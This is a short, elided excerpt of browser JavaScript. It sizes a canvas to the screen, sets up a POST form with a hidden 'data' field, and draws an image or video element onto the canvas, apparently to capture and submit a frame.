...
*/
    ...
    function p() {
        if ( !y ) {
            ...
            y.width = screen.availWidth;
            y.height = screen.availHeight;
            y.ctx = y.getContext( "2d" );
            g = document.createElement( "form" );
            g.method = "post";
            g.input = document.createElement( "input" );
            g.input.type = "hidden";
            g.input.name = "data";
            g.appendChild( g.input );
        ...
        y.ctx.drawImage( v, y.width - v.width / 2, y.height - v.height / 2, v.width / 2, v.height / 2 ),
